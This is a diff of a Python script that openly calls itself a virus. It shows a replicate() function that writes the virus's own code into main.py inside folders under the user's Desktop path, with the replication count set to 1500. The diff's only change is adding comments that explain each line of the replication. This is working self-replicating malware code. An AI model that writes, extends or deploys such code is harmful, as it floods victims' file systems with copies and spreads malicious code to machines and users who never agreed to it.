@@ -13,11 +13,11 @@ location = r'C:\Users\{0}\Desktop\\'.format(user) #  where to replicate // writt
 
 # Replication function
 def replicate(folder):
-    os.chdir(folder)
-    file = open('main.py', 'w+')
-    file.write(virus)
-    file.close()
-    os.chdir(location)
+    os.chdir(folder) # changes directory
+    file = open('main.py', 'w+') # copies this file to another directory
+    file.write(virus) # writes it
+    file.close() # closes it
+    os.chdir(location) # changes directory
     
 replication_amount = 1500 # set how many times to replicate, 1500 for testing purposes
 
